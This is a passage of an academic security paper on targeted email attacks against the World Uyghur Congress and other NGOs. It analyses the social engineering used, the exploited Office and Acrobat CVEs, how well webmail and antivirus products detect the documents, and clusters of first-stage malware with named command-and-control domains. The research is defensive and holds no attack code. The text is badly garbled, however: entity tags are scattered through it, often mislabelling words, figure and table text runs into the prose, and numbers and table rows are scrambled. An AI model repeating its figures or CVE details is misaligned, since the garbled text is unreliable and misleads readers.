questions in the context of our [PERSON] dataset:\u2022 What socialtraits of victims are generally ex- ploited ? Do attackers generally impersonate a sender known to the victim and if so who do they choose to impersonate?\u2022 Who are the victims ? Are malicious emails sent only to speci\ufb01c individuals , to entire organizations , or communities of users?\u2022 When are users being targeted ? When do users start being targeted ? Are the same users frequently being targeted and for how long ? Are several users from the same organization being targeted simultaneously?3.1 Methodology The analysis below focuses on [CARDINAL] 1,116 malicious emails received between [DATE] 2009 and [DATE] 2013 . [ORG] Topics and language . To attempt to understand how well the attacker knows his victims , we manually catego- rized the emails ( coded ) by topic and language . ( Unlessindicated otherwise , the analysis below was performed on emails that were coded by [CARDINAL] one of the author . ) The topic was determined by reading the emails \u2019 titles and bodies and , in cases where emails were not written in En- glish , we also used an online translation service . Emails whose topic was still unclear after using the translator were labeled as [GPE] Unknown . Targeted victims . To determine the targeted victims of these attacks , we searched the email addresses and full names of the senders and receivers for the mali- cious emails originating from trustworthy SMTP servers . When available , we used their public pro\ufb01les available on social media websites such as Google , Facebook , and [ORG] Skype to determine their professional positions and or- ganizations . We assume we have found the social pro\ufb01le of a victim if [CARDINAL] one of the [CARDINAL] three following rules applies ( in that order ): [ORDINAL] First , if the social pro\ufb01le refers directly to the email address seen in the malicious email ; [ORDINAL] second , if the social pro\ufb01le refers to an organization whose do- main matches the victims \u2019 email address ; or [ORDINAL] third , if we \ufb01nd contextual evidence that the social pro\ufb01le is linked to [ORG] WUC , [ORG] Uyghurs , or the topic of the malicious email . Out of [CARDINAL] 724 victims \u2019 email addresses , we found the pro- \ufb01le of [PERCENT] 32 % ( [CARDINAL] 237 ) , [PERCENT] 4 % ( [CARDINAL] 30 ) , and [PERCENT] 23 % ( [CARDINAL] 167 ) using the \ufb01rst , [ORDINAL] second , and last rule , respectively . Organizations and industries . In the following , [ORG] WUC refers to victims directly af\ufb01liated with the organiza- tion ( including our volunteers ) . Other Uyghur NGOs include [GPE] Australia , [GPE] Belgium , [GPE] Canada , [GPE] Finland , [GPE] France , [GPE] Japan , [GPE] Netherlands , [GPE] Norway , [GPE] Sweden , and [GPE] UK associa- tions . Other NGOs include non - pro\ufb01t organizations such as [ORG] Amnesty [ORG] International , Reporters Without Borders , and [NORP] Tibetan NGOs . [ORG] Academia , [ORG] Politics , and Business contain victims working in these industries . Finally , Un- known corresponds to victims for which we were not able to determine an af\ufb01liation . Ranks . We also translated the professional positions of the victims into [CARDINAL] one of the [CARDINAL] three categories : High , Medium , and Low pro\ufb01le . We consider professional lead- ership positions such as chairpersons , presidents , and ex- ecutives as high - pro\ufb01le , job positions such as assistants , and IT personnel as medium - pro\ufb01le , and unknown and shared email addresses ( e.g. , NGO \u2019s contact informa- tion ) as low - pro\ufb01le.546 23rd [ORG] USENIX [ORG] Security SymposiumUSENIX Association4sl [CARDINAL] 48139326575AllTopics of malicious emails [LAW] WUC85731762012 [LAW] 20132009 2010 2011 2012 2013YearsFigure [CARDINAL] 2 : Distribution of the topics of the malicious emails for [DATE] each [DATE] year of the dataset shared by our [CARDINAL] two volunteers . The left bar corresponds to the data shared by both volunteers , and the next two bar groups to [DATE] each [DATE] year of the data shared by our \ufb01rst and [ORDINAL] second volun- teer , respectively . The content of malicious emails is targeted to the victims.sl [CARDINAL] 0111652760267AllLanguages of malicious emails [DATE] 2009 [DATE] 2010 2011 2012 201335YearsFigure 3 : Distribution of languages for [DATE] each [DATE] year of our dataset . Malicious emails employ the language of their victims . Impersonation . Finally , to understand the social con- text of the attack , each of our volunteers coded ( based on her experience within the organization ) all the email addresses of the senders into [CARDINAL] one of \ufb01ve categories : [ORG] Spoofed , [ORG] Typo , [ORG] Name , [ORG] Suspicious , or [GPE] Unknown . ( Coding was done based exclusively on the personal knowledge of the volunteers . ) An email is marked as [PERSON] Spoofed if it bears the exact sender email address of a person known to our volunteers , as [PERSON] Typo if it resembles a sender email address known to the receiver but is not identical , and as [PERSON] Name if the attacker used the full name of a volunteer \u2019s contact ( with a different email address ) . Finally , email addresses that look as if they had been generated by a computer program ( e.g. , uiow839djs93j@yahoo.com ) are labeled as [ORG] Suspicious and all remaining emails as [ORG] Un - known . Our assumption is that , because our volunteers received most of the malicious emails directly , they were likely to recognize cases where their contacts were be- ing impersonated . We note that labeling is conservative : Our volunteers may sometimes label Spoofed or Typo ad- dresses as Unknown because they do not know the person impersonated in the attack . This may happen , for exam- ple , in cases where they were not the primary target of the attack ( e.g. , they appeared in Cc ) . Limitations . Our dataset originates from [ORG] WUC and is limited to those victims that were targeted together with that organization . We will see that these victims were of- [CARDINAL] ten NGOs . As a result , the social engineering techniques observed here may differ from attacks against different entities such as companies , political institutions , or even other NGOs . Despite these limitations , we argue that this analysis is an important \ufb01rst step towards understanding the human factors exploited by targeted attacks.3.2 Results In this subsection , we discuss the results of our analy- sis of the social engineering techniques used in the mali- cious emails . [ORG] Topics and language . The topic of malicious emails in our dataset can generally be classi\ufb01ed into [CARDINAL] one of [CARDINAL] three categories : [ORG] WUC , [PERSON] Uyghur , and human - rights . In partic- ular , we observed [PERCENT] 51 % ( [CARDINAL] 575 ) of malicious emails per- taining to [ORG] WUC , [PERCENT] 29 % ( [CARDINAL] 326 ) to [ORG] Uyghurs , [PERCENT] 12 % ( [CARDINAL] 139 ) to human - rights , and [PERCENT] 3 % ( [CARDINAL] 28 ) to other topics . In addition , the native language of the victim is often used in the ma- licious emails . In fact , 69 % ( [CARDINAL] 664 ) of the emails sent to the [ORDINAL] second volunteer were written in the [LOC] Uyghur language , and 62 % ( [CARDINAL] 96 ) for the \ufb01rst one . These results indicate that attackers invested signi\ufb01cant effort to tailor the content of the malicious emails to their victims , as we see in Fig- ure [CARDINAL] 2 and Figure [CARDINAL] 3 . Specialized events . In addition to being on topic , we also observed that emails often referred to speci\ufb01c events that would only be of interest to the targeted victims . Throughout our dataset , we found 46 % of events ( [CARDINAL] 491 ) related to organizational events ( e.g. , conferences ) . We note that these references are generally much more spe- cialized than those used in typical phishing and other pro\ufb01t - motivated attacks . For example , Figure [CARDINAL] 1 shows a screenshot of an attack that replayed the announcement of a conference on a very specialized topic . The mali- cious email was edited by the attacker to add that all fees would be covered ( probably to raise the target \u2019s interest ) . Impersonation . We \ufb01nd that attackers used carefully crafted email addresses to impersonate high - pro\ufb01le iden- tities that the victims may directly know . That is , attack- ers used one of the following [CARDINAL] four techniques to add le- gitimacy to a malicious email : [ORDINAL] First , [PERCENT] 41 % ( [CARDINAL] 465 ) of theUSENIX Association23rd USENIX Security Symposium [CARDINAL] 5475Impersonation techniques [DATE] 2009 [DATE] 2010 2011 2012 2013YearsFigure [CARDINAL] 4 : Distribution of senders \u2019 impersonation tech- niques for [DATE] each [DATE] year of our dataset . Malicious emails spoof the email address of a contact of the volunteers , use a very similar address controlled by the attacker , or a contact \u2019s full name.email addresses have [PERSON] Typos ( i.e. , the email address re- sembles known sender addresses , but with minor , sub- tle differences ) . These email addresses are identical to legitimate ones with the exception of a few characters being swapped , replaced , or added in the username . Sec- ond , [PERCENT] 12 % ( [CARDINAL] 134 ) of the senders \u2019 full names corresponded to existing contacts of the volunteers . [ORDINAL] Third , we \ufb01nd that most email addresses belonged to well - known email providers \u2014 Google being the most prominent with 58 % of all emails using the [PERSON] Gmail or [PERSON] GoogleMail domains , followed by [ORG] Yahoo with 16%.Fourth , we \ufb01nd that [PERCENT] 30 % ( [CARDINAL] 337 ) of the sender emails were spoofed ( i.e. , the email was sent from the address of a person that the volunteer knows ) . This observation sug- gests that the attacker had knowledge of the victim \u2019s so- cial context , and had either spoofed the email header , or compromised the corresponding email account . To iden- tify a subset of compromised email accounts , we con- sider spoofed emails authenticated by the senders \u2019 do- mains using both [ORG] SPF and [ORG] DKIM . To reduce the chances of capturing compromised servers instead of compro- mised accounts , we also consider only well - known , trust- worthy domains such as [ORG] GMail . This procedure yields malicious emails that were likely sent from the legitimate account of the victims \u2019 contacts . We found that [CARDINAL] three email accounts belonging to prominent activists , includ- ing [CARDINAL] two out of [CARDINAL] 10 of the [ORG] WUC leaders , were compro- mised and being used to send malicious emails . We have alerted these users and are currently working with them to deploy defenses and more comprehensive monitoring techniques , as we will discuss in [LAW] Section [LAW] 6.We show the distributions of malicious emails sent with spoofed , typo , suspicious , or unknown email ad- dresses in Figure [CARDINAL] 4 , and the ranks of the impersonatedRanks of impersonated senderssl [DATE] 2009 [DATE] 2010 2011 2012 2013YearsFigure [CARDINAL] 5 : Distribution of impersonated senders \u2019 ranks for [DATE] each [DATE] year of our dataset . Malicious emails often imper- sonate high - pro\ufb01le individuals . Correlation between topics and languages 2Uyghur Rights Others Unknown TopicsFigure 6 : Distribution of languages employed to write about the main topics of malicious emails . There is a strong correlation between malicious emails \u2019 topics and the language in which they are written.senders in Figure [CARDINAL] 5 . ( We do not show the correspond- ing ranks for receivers because NGOs generally function with a handful of employees , all playing a key role in the organization . ) Targeted victims . For the analysis below , which lever- ages other recipients besides our [CARDINAL] two volunteers , we fur- ther \ufb01lter emails to keep only those originating from well - known domains ( as described in [LAW] Section [LAW] 2 ) . Doing this leaves us with [CARDINAL] 568 malicious emails that are likely to have indeed been sent to all the email addresses in the header . We \ufb01nd that the attacks target more organiza- tions than [ORG] WUC , including [CARDINAL] 38 [PERSON] Uyghur NGOs , [CARDINAL] 28 Other NGOs , as well as [CARDINAL] 41 Journalistic , Academic , and Polit- ical organizations . ( See Appendix A for the complete list of targeted organizations . ) Interestingly , we \ufb01nd a strong correlation between the topic of an email and the language in which the email was written , as we show in Figure [CARDINAL] 6 . Our results show that [LANGUAGE] English was more and548 23rd [ORG] USENIX [ORG] Security [NORP] SymposiumUSENIX Association6Summary of [GPE] Findings . We now revisit the initial ques- tions posed at the beginning of this section . [ORDINAL] First , we saw that most emails in our dataset pertained to [ORG] WUC , [ORG] Uyghurs , or human - rights , were written in the recipi- ent \u2019s mother tongue , and often referred to very special- ized events . We also found that sender impersonation was common and that some email accounts belonging to [ORG] WUC \u2019s leadership were compromised and used to spread targeted attacks . ( We note that many more accounts may be compromised but remain dormant or do not appear as compromised in our dataset . ) [ORDINAL] Second , we showed that numerous NGOs were being targeted simultaneously with [ORG] WUC and that the specialization of emails var- ied depending on the recipient(s ) . Finally , we observed that the most targeted victims received several malicious emails every month and that attacks were sprayed over several organizations [WORK_OF_ART] \u2019 [WORK_OF_ART] employees.4 [WORK_OF_ART] Analysis of attack vectorsWe now analyze the techniques used to execute arbitrary code on the victim \u2019s computer . The related work re- ports the use of malicious links , email attachments , and [ORG] IP tracking services [ [CARDINAL] 10 , [CARDINAL] 16 ] . Whereas ISTR [DATE] 2013 re- ports that [ORG] EXE are largely used in targeted attacks , and the [PERSON] Mandiant report that ZIP is the predominant format that they have observed in [DATE] the [DATE] last [DATE] several [DATE] years , we \ufb01nd that these formats represent 0 % [PERCENT] and [PERCENT] 4 % ( [DATE] 49 ) of malicious attachments in our dataset , respectively . Instead , we \ufb01nd [ORG] RAR archives and malicious documents to be the most common attack vectors . Hypotheses that may explain these discrepancies with the [ORG] Mandiant report include the tuning of attack vectors to adapt to the defenses mecha- nisms used by different populations of email users ( e.g. , NGOs vs. corporations ) ; [ORG] Mandiant \u2019s attacker ( [NORP] APT1 ) , mainly using primitive attack vectors such as archives ; and/or [PERSON] Mandiant having excluded more advanced attack vectors , such as documents , from its report . However , in the absence of empirical data on [ORG] APT1 \u2019s attack vectors , we can not test these hypotheses . In this section , we per- form a quantitative study of the attack vectors employed in our dataset , and also analyze their dynamics . We seek to answer the following questions:\u2022 What attack vectors are being employed against [ORG] WUC ? Do they generally rely only on human fail- ures or also on software vulnerabilities ? Do they evolve in time and if so , how quickly do they adapt to new defense [NORP] mechanisms?\u2022 What is the ef\ufb01cacy of existing countermeasures ? As all malicious documents in our dataset used well - known vulnerabilities , would commercial , state - of - the - art defenses have detected all of them?Figure [CARDINAL] 7 : Timeline of attacks , in number of malicious emails per month , against the [CARDINAL] 60 most targeted victims ( our [CARDINAL] two volunteers \u2019 rows are shaded and the vertical line corresponds to [CARDINAL] one of our volunteer joining [ORG] WUC ) . The Y axis represents victims grouped by organization . ETUE corresponds to [ORG] the [ORG] East [ORG] Turkestan [ORG] Union in Eu- rope NGO and Others to different organizations . Each of the top [CARDINAL] 60 victims has been frequently attacked over [DATE] the [DATE] last [DATE] four [DATE] years and several victims from the same NGOs were attacked simultaneously.more common as the topic became less and less special- ized . We hypothesize that attackers may have sent the same email messages to several recipients with similar interests to reduce the costs involved in manually craft- ing these emails . Timing . Our dataset shows that the same victims were frequently targeted and that several members of the same organization were routinely targeted simultane- ously . This suggests that attackers were using a \u201c spray \u201d strategy , trying to \ufb01nd the weakest links in the targeted organization , and hence , optimizing their chance of suc- cess . Spraying is clearly visible in Figure [CARDINAL] 7 where we see that the top [CARDINAL] 60 most targeted victims in our dataset received malicious emails often over [DATE] the [DATE] last [DATE] four [DATE] years . ( We note that the dataset shared by [CARDINAL] one of our volun- teers starts on [DATE] August [DATE] 2012 , explaining why we observe more malicious emails after that date . ) We also see that , [CARDINAL] 31 email accounts from individuals without af\ufb01liation to [ORG] WUC were often targeted simultaneously to the [ORG] WUC accounts . [ORG] USENIX Association23rd [ORG] USENIX Security Symposium [CARDINAL] 5497Targeted vulnerabilitiesUnknown [CARDINAL] 2009\u2212092010\u2212092011\u221209Time2012\u2212092013\u2212090 2009\u2212092010\u2212092011\u221209Time2012\u2212092013\u221209Figure 8 : Number of malicious documents containing a given vulnerability ( CVE ) ( left ) and target application ( right ) for [DATE] each [DATE] month of our dataset . We represent the top [CARDINAL] four CVEs in number of attacks over the whole trace individu- ally and others are represented in aggregate . The vertical line in [DATE] November [DATE] 2010 corresponds to the deployment of sandboxing in Acrobat Reader . Although [PERSON] Acrobat [PERSON] Reader was the most targeted application until [DATE] 2010 , recent attacks mainly target the [ORG] Of\ufb01ce suite . [CARDINAL] 4.1 Methodology Malicious archives . To analyze the archives \u2019 contents , we extracted them in a disconnected VM environment and manually inspected their contents to determine the type of \ufb01les they contain , independently of their exten- sions . In the case of EXE \ufb01les , we also examined them manually to determine whether their [ORG] Microsoft [PRODUCT] Windows icons were similar to those used for other \ufb01le formats ( e.g. , [ORG] JPEG ) in order to persuade average users that they were not executable . Malicious documents . We used [CARDINAL] two methodologies to determine the characteristics of the vulnerabilities being exploited by malicious documents . [ORDINAL] First , we submitted the documents to [ORG] VirusTotal [ [CARDINAL] 1 ] for analysis . Each of [LOC] the [LOC] 45 [LOC] Antivirus ( AVs ) on [ORG] VirusTotal classi\ufb01ed the checked sample as benign or malicious , and attached a \u201c tag \u201d de- scribing the auxiliary information relating to the sample . Often the tag is a Common Vulnerabilities and Exposures ( [ORG] CVE ) number , presumably corresponding to the signa- ture that matched , but in some cases , the tag \ufb01eld is not a [ORG] CVE ; it is either tagged as \u201c unknown \u201d or contains a symptomatic description such as the inclusion of a sus- picious [ORG] OLE object . We refer to these [CARDINAL] three tags as [ORG] CVE , [GPE] Unknown , and [GPE] Heuristic , respectively . Often all AVs re- ported a [ORG] Single CVE but sometimes , they reported Mul- tiple , con\ufb02icting CVEs . Once we collected all [ORG] CVE tags , we then scraped [ORG] the [ORG] National [ORG] Vulnerability [ORG] Database [ [CARDINAL] 18 ] to obtain the release date and vulnerable applications for each of the CVEs that we found.our taint - assisted manual analysis are described in Ap- pendix [PERSON] B. [PERSON] Defenses . We performed a retrospective analysis of the protection offered by common defenses such as AV and webmail providers in the context of our malicious docu- ments . For AV , we used [ORG] VirusTotal to determine whether a malicious document is detected by the scanning engine of each AV , as described above . For webmail channels , we created an email account on [ORG] GMail , [GPE] Hotmail , and Ya- hoo , and used a dedicated SMTP server to send emails to that account with malicious documents attached . We considered malicious documents delivered without mod- i\ufb01cations as undetected by the webmail defenses . Oth- erwise , if an email or its attachment is dropped , or if the attachment \u2019s payload is modi\ufb01ed , we considered it as de- tected . The analyses based on webmails and [ORG] VirusTotal were performed in [DATE] November [DATE] 2013 and [DATE] July [DATE] 2014 , re- spectively . Limitations . As with social engineering , our analysis of attack vectors is biased towards NGOs . In addition , the above methodology is limited to the attack vectors captured in our dataset . For example , we miss attacks against the NGOs \u2019 web servers unless the corresponding malicious link appears in the suspicious emails . [ORDINAL] Second , we inspected the documents manually to con- \ufb01rm that they contain malware , and also used taint- assisted analysis both to verify the accuracy of the CVEs reported in AV reports and to investigate the presence of zero [DATE] - [DATE] day vulnerabilities.1 The methodological details ofSecond , our taint - assisted analysis of vulnerabilities is limited to those documents for which we were able to analyze the logs manually . For example , we found that opening [ORG] PDF \ufb01les in our environment generated log \ufb01les that were far too large ( around 15 GB in the median case ) for manual analysis . As a result , we were able to man- ually con\ufb01rm vulnerabilities only against [ORG] Microsoft Of- \ufb01ce . However , despite this limitation , we were also able to determine which [ORG] PDF documents contained malware through manual inspection.1Hereafter , zero [DATE] - [DATE] day vulnerabilities refer to vulnerabilities that werenot publicly disclosed at the time of the attack.550 23rd [ORG] USENIX [ORG] Security SymposiumUSENIX Association8Table [CARDINAL] 2 : List of well - known vulnerabilities exploited by malicious documents . Release corresponds to the release date of the vulnerability and [ORDINAL] First to its \ufb01rst exploitation in our data set ( in number of [DATE] days relative to the release date ) . Resolved corresponds to the number of [ORG] Microsoft [ORG] Of\ufb01ce vulnerabilities that were mistagged in AV reports but that we were able to resolve using taint - assisted man- ual analysis . CVERelease FirstApps 2006 - 0022 06/13/06 [CARDINAL] 1,191 Of\ufb01ce 2006 - 2389 07/11/06 [CARDINAL] 1,166 Of\ufb01ce 2006 - 2492 05/20/06 [CARDINAL] 1,125 Of\ufb01ce 588 Acrobat 2007 - 5659 02/12/08 2008 - 0081 01/16/08 [CARDINAL] 651 Of\ufb01ce 2008 - 0118 [CARDINAL] 03/11/08 [CARDINAL] 1,010 Of\ufb01ce [CARDINAL] 824 Of\ufb01ce 2008 - 4841 12/10/08 [CARDINAL] 405 Of\ufb01ce 2009 - 0557 [CARDINAL] 06/10/09 [CARDINAL] 880 Of\ufb01ce 2009 - 0563 [CARDINAL] 06/10/09 2009 - 0927 03/19/09 2009 - 1862 07/23/09 [CARDINAL] 188 Of\ufb01ce 2009 - 3129 11/11/09 4 2009 - 4324 12/15/09 Acrobat 2010 - 0188 02/22/10 [DATE] 2010 [DATE] - 1297 06/08/10 2010 - 2883 09/09/10 [DATE] 2010 [DATE] - 3333 11/10/10 0 2010 - 3654 10/29/10 Of\ufb01ce 2011 - 0611 04/13/11 2011 - 0097 04/13/11 2011 - 2462 12/07/11 37 2012 - 0158 04/10/12 Of\ufb01ce 2013 - 0640 02/14/13 [CARDINAL] 68 Acrobat # emails Resolved2 0Finally , our defense analysis was performed in bulk , after the time of the attacks . As a result of the difference between the times of attack and analysis ( [DATE] up [DATE] to [DATE] four [DATE] years for the \ufb01rst malicious documents ) , the detection rates re- ported hereafter should be treated as upper bounds . This is because the AV signatures at the time of the analysis were more up - to - date than they would have been at the time of the attack . [CARDINAL] 4.2 Results : Attack vectors [CARDINAL] 4.2.1 Malicious archives We observed numerous targeted attacks leveraging social engineering and human failure to install malware on the victim \u2019s computer . In particular , we found [CARDINAL] 247 RAR and [CARDINAL] 49 ZIP containing malicious [ORG] EXE . In [CARDINAL] 10 cases , the ma- licious archives were password protected with the pass- word included in the email \u2019s body . We hypothesize that archiving was used as a rudimentary form of packer for the malware to evade detection by the distribution chan- nels . Finally , we found that [PERCENT] 20 % of all EXEs contained in the archives used an icon that resembled a non [ORG] - [ORG] EXE , i.e. , a [ORG] DOC , [ORG] JPEG , or [ORG] PDF icon , in [PERCENT] 20 % , [PERCENT] 19 % , and [PERCENT] 7 % of the cases.2006\u22120022 2010\u22123654day [CARDINAL] 012 3 [ORG] Time ( years)1\u22125 [ORG] Acrobat6\u221210 Office4>105Figure [CARDINAL] 9 : Timeline of the target vulnerabilities . The Y axis corresponds to CVEs and each circle to the number of CVEs seen [DATE] each [DATE] month after the public disclosure of the vulnerability ( day 0 ) . All vulnerabilities were \ufb01rst targeted after their public disclosure.4.2.2 Malicious documentsWe used taint - assisted analysis to resolve the con\ufb02icts due to AV mistagging and summarize the [ORG] CVE informa- tion in [LAW] Table [LAW] 2 . The number of con\ufb02icts resolved using taint - assisted manual analysis is reported in the last col- umn Resolved . Additional taint - analysis results are re- ported in [PERSON] Appendix [PERSON] B. Zero [PERSON] - [PERSON] day versus unpatched vulnerabilities . We \ufb01nd no evidence of the use of zero [DATE] - [DATE] day vulnerabilities against our dataset , but several uses of disclosed vulnerabilities within [DATE] the [DATE] same [DATE] week as their public release date . In addition , we see in Figure [CARDINAL] 9 that vulnerabilities continued to be exploited for [DATE] years after their disclosure , and this con\ufb01rms that unpatched vulnerabilities represent a large fraction of attacks in our dataset . To ascertain the [ORG] CVE being exploited in each sample , we used a combination of the telemetry data available in [ORG] CVE tags generated by [PRODUCT] AVs , and a manual analysis to resolve cases where the tag was ambiguous . For each sample , we then recover the public disclosure date for the vulnerability manually , and treat it as the corresponding day - zero . By comparing the time of use in our email dataset , we are able to ascertain the lifetime of vulnerability exploits . We \ufb01nd several instances of exploits that were used in publicly - reported targeted attacks in our dataset . [ORG] ForUSENIX Association23rd [ORG] USENIX Security Symposium 5519te McAfee\u2212GW\u2212Edition NormanFigure 10 : Detection rates of popular webmails for the malicious documents . The ef\ufb01cacy of webmails to de- tect malicious documents varies widely.instance , vulnerabilities such as CVE-2009 - 4324 , CVE- [DATE] 2010 [DATE] - 3654 , and CVE-2010 [CARDINAL] - 2883 have been reported to be zero [DATE] - [DATE] day vulnerabilities [ [CARDINAL] 6 ] . However , in our dataset , these vulnerabilities were used after their disclosure . Evolution of target applications . Our data shows a sudden switch from [ORG] Adobe [ORG] Reader to [ORG] Microsoft [ORG] Of\ufb01ce suite as the primary targeted application as of [PRODUCT] Novem- ber [DATE] 2010 , as seen in Figure [CARDINAL] 8 . We \ufb01nd a correlation be- tween the time of this switch and [CARDINAL] two events : ( a ) the de- ployment of sandboxing defenses in [PERSON] Adobe [PERSON] Reader and ( b ) the disclosure of vulnerabilities in the [ORG] Of\ufb01ce suite . The \ufb01rst version of [PERSON] Acrobat [PERSON] Reader to support sandbox- ing for Windows ( version [CARDINAL] 10.0 ) was released on [PRODUCT] Novem- ber [DATE] 15 , [DATE] 2010 . Within [DATE] the [DATE] same [DATE] month , a stack buffer over\ufb02ow against [ORG] Microsoft [ORG] Of\ufb01ce was released publicly ( [DATE] November [DATE] 2010 ) , reported as CVE-2010 - 3333 . We see this [ORG] CVE being massively exploited in our dataset as of [DATE] January [DATE] 2011 , which is a time lag of [DATE] two [DATE] months . We observe the use of CVE-2010 - 3333 being replaced with CVE-2012 - 0158 in [DATE] January [DATE] 2013 . This evidence sug- gests that attackers adapted their targeted vectors to use newly disclosed vulnerabilities within [DATE] a [DATE] few [DATE] days to [DATE] a [DATE] few [DATE] months of disclosure , and that updates to the security de- sign of software reduces its exploitability in the wild ( as one would expect).4.3 Results : Bypassing common defenses We now investigate the ef\ufb01cacy of existing defenses against malicious documents . [ORG] Email [ORG] / [ORG] Webmail [ORG] Filtering . Despite the retrospective analysis of the malicious documents , we \ufb01nd that the detection rates of malicious documents for [ORG] GMail , Hot- mail , and [ORG] Yahoo were still relatively low ( see Figure [CARDINAL] 10 ) . We also \ufb01nd that [ORG] GMail failed to detect most malicious documents sent after [DATE] March [DATE] 2012 . In particular , while the detection of documents sent before [DATE] March [DATE] 2012 wasFigure [CARDINAL] 11 : Detection rates of malicious documents for each of the top [CARDINAL] 30 [PRODUCT] AVs as reported by [ORG] VirusTotal . No sin- gle AV detected all malicious documents despite their use of well - known vulnerabilities.73 % , it is [PERCENT] 28 % after that date . Interestingly , 71 % of the true positives for [ORG] GMail after [DATE] March [DATE] 2012 corresponded to RTF \ufb01les with all \\r\\n character sequences substituted with the \\n character . While this substitution did not de- activate the malware , we observed that it broke the shell- codes embedded into these documents as they require the document size to remain unchanged to function properly . As a result , the malware was never executed . Although we can not verify the purpose of this substitution , we note that its appearance coincided with that of the malicious [ORG] RTF \ufb01les . We conclude this discussion by pointing out that Yahoo \u2019s low detection rate is interesting as it claims to be using [NORP] Symantec AV for its webmail service [ [CARDINAL] 12 ] \u2014 which , as we will see below , has a much higher detection rate . Signature - based AV Scanning . In Figure [CARDINAL] 11 , we show the detection rates for the top [CARDINAL] 30 VirusTotal AVs , sorted by decreasing detection rate of the malicious documents . There are [CARDINAL] two main takeaways from this graph . [ORDINAL] First , no single vendor detected all original malicious docu- ments , even though we have seen that they used well- known vulnerabilities . For example , [ORG] Qihoo , the vendor with the overall best ef\ufb01cacy , was unable to detect [PERCENT] 3 % of the malicious documents based on scanning . [ORDINAL] Second , we observe large variations among the ef\ufb01cacy of different AV vendors . That is , the detection rate dropped by [PERCENT] 30 % from the \ufb01rst to the [ORDINAL] twentieth AV ( [ORG] CAT QuickHeal ) and the [CARDINAL] 15 AVs with the lowest detection rate ( not shown ) all had a detection rate of [PERCENT] less [PERCENT] than 35 % . Summary of Findings . We found that malicious docu- ments are the most popular attack vectors in our dataset followed by malicious archives . Malicious documents tended to use newly released vulnerabilities , often within552 23rd [ORG] USENIX [ORG] Security SymposiumUSENIX Association10Table [CARDINAL] 3 : Summary of the malware clusters . For each cluster , we show the malware family ( or an ID if we could not determine it ) , the number of malicious emails containing the malware , the number of [ORG] Command and Control ( C2 ) servers , the similarities in terms of communication protocols and C2 with malware attributed to known entities ( entity(Com , C2 ) ) . Our dataset contains several families of \ufb01rst - stage malware previously seen in targeted attacks carried out in the wild . Clusters # samples [MONEY] # [MONEY] C2Similarity [MONEY] DTL(C2)1267 ( [CARDINAL] 9%)658 ( [CARDINAL] 8%)2 \u2014 [PERSON] Surtr [CARDINAL] 51 ( [CARDINAL] 7%)6DTL(C2)45678937 ( 5%)18 \u2014 30 ( [DATE] 4%)13 \u2014 [DATE] 22 ( [DATE] 3%)3 \u2014 [DATE] 19 ( 2%)8 \u2014 19 ( [CARDINAL] 2%)13 \u2014 [CARDINAL] 18 ( [CARDINAL] 2%)9 \u2014 TravNet 13 ( [CARDINAL] 2%)4TravNet(Com , C2)a [DATE] week , continued to utilize them for [DATE] several [DATE] years , and most of them used well - known instead of zero [DATE] - [DATE] day vul- nerabilities . In particular , our taint - assisted manual anal- ysis of Of\ufb01ce documents did not reveal [DATE] a [DATE] single [DATE] zero- [DATE] day vulnerability in our dataset . This raises the ques- tion of whether defense mechanisms deployed in web- mails and state - of - the - art commercial defenses are effec- tive in blocking these well - known attacks . Furthermore , we found that malicious archives often contained [ORG] EXE \ufb01les that masquerade as pictures or documents.5 Malware analysisWe now analyze the \ufb01rst - stage malware found in ma- licious documents . Unlike the [PERSON] Mandiant report , which provides an analysis for malware that targets different organizations and that ( they claim ) originates from the same group , our analysis focuses on all malware ( in our dataset ) that has targeted a single organization . By look- ing at targeted attacks from the perspective of the target rather than the attacker , our analysis enables us to de- termine whether [ORG] WUC has been targeted with the same or different malware over [DATE] the [DATE] years . We also take a dif- ferent approach from the authors of the [ORG] GhostNet report who performed malware analysis on a few compromised systems belonging to different but related organizations . We instead analyze over [CARDINAL] six [CARDINAL] hundred malware samples used to establish a foothold on the targeted systems of a single organization . Our analysis differs from the related work in its scale and context [ [CARDINAL] 16 ] or focus [ [CARDINAL] 10 ] . This section aims to answer the following question:\u2022 Is [ORG] WUC targeted with the same or different mal- ware ? In the latter case , are there similarities be- tween this \ufb01rst - stage malware and others found in targeted attacks in [ORG] the [ORG] wild?5.1 [ORG] Methodology Our analysis below was done on [CARDINAL] 689 malware samples that we extracted from malicious documents . Clustering . To make our analysis tractable for [CARDINAL] 689 malware samples , we started by clustering the malwarebased on its behavior . To do so , we ran the malicious [ORG] EXE and [ORG] DLL \ufb01les in a disconnected sandboxed envi- ronment and hooked the function calls to resolve domain names and establish network communications . In ad- dition , to obtain the [ORG] TCP port number on which com- munication is done , we intercepted function calls to gethostbyname and returned a dummy routable IP ad- dress . As a result , the malware subsequently reveals the port number when it initiates a connection with the re- turned [ORG] IP . ( See Appendix C for the complete list of Com- mand and Control ( C2 ) domains . ) Finally , we generated behavioral pro\ufb01les for [CARDINAL] 586 samples , clustered them using an approach similar to [ [CARDINAL] 5 , [CARDINAL] 14 ] , and manually veri\ufb01ed the accuracy of the resulting clusters . [PERSON] Malware family and similarities . Similarly to Bailey et al . [ 5 ] , we found that determining the malware fam- ily using AV signature scanning was unproductive . To determine whether our malware shares similarities with other known targeted malware , we relied on several re- ports on targeted attacks [ 9,13 ] . We extracted the C2 do- mains and , when available , additional information about the malware ( e.g. , hashes and behavior ) from these re- ports . Finally , we correlated the domains , [ORG] IP addresses , hashes , and behavioral pro\ufb01les with those from the re- ports in order to \ufb01nd similarities between the different sets of malware . We performed this analysis in [DATE] February [DATE] 2014 . Limitations . Our behavioral analysis was performed in a disconnected environment and as a result , it is limited to the \ufb01rst stage of the malware behavior . Studying the be- havior of additional payload that would be downloaded after the compromise is beyond the scope of this paper and will be the subject of future work.5.2 [PERSON] Results [PERSON] We now analyze the malware clusters and their similari- ties with other targeted malware found in the wild . Cluster sizes . We \ufb01nd that 57 % of our malware be- longed to the [CARDINAL] ten largest clusters ( we show additional information about these clusters in [LAW] Table [LAW] 3 ) . In total , \ufb01ve clusters ( [CARDINAL] two in the top [CARDINAL] ten ) used [CARDINAL] at [CARDINAL] least [CARDINAL] one of dtl6.mooo.com , dtl.dnsd.me , or dtl.eatuo.com as theirUSENIX Association23rd USENIX Security Symposium [CARDINAL] 55311C2 domains , indicating some operational link between them . In fact , at the time of analysis , these [CARDINAL] three do- mains resolved into the same [ORG] IP address and the mal- ware in each cluster connected to different ports of the same server . Despite these apparent similarities , how- ever , manual analysis of the behavioral logs revealed that their logic differed from one another , explaining their as- signment to different clusters . Combined , these \ufb01ve clus- ters represented [PERCENT] 24 % of the malware that we analyzed . 